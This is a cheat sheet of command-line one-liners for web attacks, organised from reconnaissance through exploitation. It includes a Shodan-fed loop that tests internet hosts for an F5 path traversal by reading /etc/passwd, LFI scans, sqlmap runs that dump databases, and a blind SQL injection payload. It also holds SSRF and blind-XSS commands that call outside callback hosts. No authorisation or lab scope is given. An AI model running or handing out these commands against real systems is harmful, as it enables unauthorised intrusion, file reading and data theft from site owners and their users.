### 1. **Reconnaissance / Information Gathering**
   - **Subdomain Enumeration:**
     ```bash
     subfinder -dL /home/kali/Tools/Target.txt -o subfinder.txt
     subfinder -dL /home/kali/Tools/Target.txt | httpx -status-code
     amass enum -passive -norecursive -noalts -df /home/kali/Tools/Target.txt -o amass.txt
     sublist3r -d https://target.com/ -o sublist3r.txt
     subfinder -dL /home/kali/Tools/target.txt -all -recursive > subtarget.txt
     subfinder -d viator.com -all -recursive > subdomain.txt
     findomain -t https://target.com -q | httpx -silent | anew | waybackurls | gf sqli >> sqli
     ```

   - **URL Discovery & HTTP Probing:**
     ```bash
     cat /home/kali/Tools/Target.txt | waybackurls | grep "?" | uro | httpx -silent > urls
     subfinder -dL /home/kali/Tools/target.txt -silent -all | httpx -silent -ports http:80,https:443,2082,2083 -path 'cpanelwebcall/<img%20src=x%20onerror="prompt(document.domain)">aaaaaaaaaa' -mc 400
     subfinder -d target.com -all | naabu | httpx | nuclei -t nuclei-templates
     echo https://Target.com | hakrawler > testphp.txt && cat testphp.txt | grep -o "http[^ ]*" > testphp_filter_urls.txt && cat testphp_filter_urls.txt | grep = > testphp_parameter_urls.txt
     echo $domain | (gauplus || hakrawler) | grep -Ev "\.(jpeg|jpg|png|ico|woff|svg|css|ico|woff|ttf)$" > ./gaukrawler.txt
     ```

   - **Shodan for Reconnaissance:**
     ```bash
     shodan search http.favicon.hash:-1252041730 "3992" --fields ip_str,port --separator " " | awk '{print $1":"$2}' | while read host; do curl --silent --path-as-is --insecure "https://$host/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd" | grep -q root && \printf "$host \033[0;31mVulnerable\n" || printf "$host \033[0;32mNot Vulnerable\n"; done
     ```

   - **Directory Traversal & File Inclusion Discovery:**
     ```bash
     python3 dotdotslash.py -u https://target.com
     cat /home/kali/Tools/target.txt | (gau || hakrawler || waybackurls || katana) | gf lfi | httpx -paths lfi_wordlist.txt -threads 100 -random-agent -x GET,POST -tech-detect -status-code -follow-redirects -mc 200 -mr "root:[x*]:0:0:"
     ```

   - **Miscellaneous Discovery:**
     ```bash
     cat /home/kali/Tools/target.txt | grep -E "\.txt|\.log|\.cache\.secret|\.db.backup\.yml|\.json|\.gz|\.rar|\.zip|\.config"
     cat /home/kali/Tools/target.txt | grep -E "\.js$" >> js.txt
     ```

### 2. **Vulnerability Scanning**
   - **Nmap Scanning:**
     ```bash
     nmap -Pn -A -sV -sC (IPTarget) -p 17,80,20,21,22,23,24,25,53,69,80,123,443,1723,4343,8081,8082,8088,53,161,177,3306,8888,27017,27018,139,137,445,8080,8443 -oN scan-result.txt --script=vuln
     ```

   - **CORS Misconfiguration:**
     ```bash
     python3 corsy.py -i /home/kali/Tools/Target.txt
     cat /home/kali/Tools/Target.txt | CORS-Scanner
     corscanner -i /home/kali/Tools/Target.txt -v -t 100
     ```

   - **Specific Vulnerability Scanning with Nuclei:**
     ```bash
     nuclei -u https://Target.com -w nuclei-templates/cloud/aws/aws-code-env.yaml
     nuclei -list /home/kali/Tools/Target.txt -t /root/nuclei-templates/vulnerabilities -t /root/nuclei-templates/cves -t /root/nuclei-templates/exposures -t /root/nuclei-templates/sqli.yaml
     nuclei -list http_urls.txt -w workflows/wordpress-workflow.yaml
     nuclei -list /home/kali/Tools/Target.txt -w nuclei-templates/http/exposures/configs/symfony-profiler.yaml
     ```

### 3. **Exploitation**
   - **SQL Injection (SQLi):**
     ```bash
     sqlmap -u https://Target.com/ --dbs --forms --crawl=2
     sqlmap -g /home/kali/Tools/Target.txt --dbs --forms --crawl=2
     sqlmap -u "https://target.com" --dbs --level=5 --risk=3 --user-agent -v3 --tamper="between,randomcase,space2comment" --batch --dump
     subfinder -dL /home/kali/Tools/Target.txt | dnsx | waybackurls | uro | grep "?" | head -20 | httpx -silent > urls; sqlmap -m urls --batch --random-agent --level 1 | tee sqlmap.txt
     ```

   - **Cross-Site Scripting (XSS):**
     ```bash
     dalfox file /home/kali/Tools/Target.txt -b https://hahwul.xss.ht -o Vulnerable_XSS.txt
     cat /home/kali/Tools/Target.txt | Gxss -p khXSS -o XSS_Ref.txt
     waybackurls https://Target.com/ | gf xss | grep '=' | qsreplace '"><script>confirm(1)</script>' | while read host; do curl --silent --path-as-is --insecure "$host" | grep -qs "<script>confirm(1)" && echo "$host \033[0;31mVulnerable\n"; done
     ```

   - **Server-Side Request Forgery (SSRF):**
     ```bash
     python3 pwnssrf.py -H https://target.com
     cat /home/kali/Tools/target.txt | gf ssrf | sort -u | anew | httpx | qsreplace 2jmepn2tt7m7o95ckt40660omfs6gw4l.oastify.com | xargs -I % -P 25 sh -c 'curl -ks "%" 2>&1 | grep "compute.internal" && echo "SSRF VULN! %"'
     ```

   - **Blind SQL Injection:**
     ```bash
     cat /home/kali/Tools/Target.txt | grep "=" | qsreplace "1 AND (SELECT 5230 FROM (SELECT(SLEEP(10)))SUmc)"> blindsqli.txt
     ```

### 4. **Post-Exploitation**
   - **Exploit Scripts:**
     ```bash
     python3 jok3r.py attack -t target.com-s http --cat-only vulnscan --add2db hackingloops
     python2 pwnredir.py -u https://Target.com -f payloads.list
     python3 exploit.py -l /home/kali/Tools/target.txt -t 200 -o output.txt -ftd /etc/passwd
     ./gochopchop scan --url-file /home/kali/Tools/target.txt
     ./xray_linux_amd64 ws --basic-crawler https://target.com --plugins cmd-injection,sqldet --html-output target.com.html
     ```

### 5. **Miscellaneous**
   - **Custom Scripts & Tools:**
     ```bash
     python ws.py -t
     python vulmap.py -u https://target.com
     shodanx custom -cq '"Server: Check Point SVN" "X-UA-Compatible: IE=EmulateIE7" 200' -fct ip -o /home/kali/Tools/target.txt
     python3 pwnxss.py -u https://Target.com
     python2 pwnredir.py -u https://target.com -f payloads.list
     ```

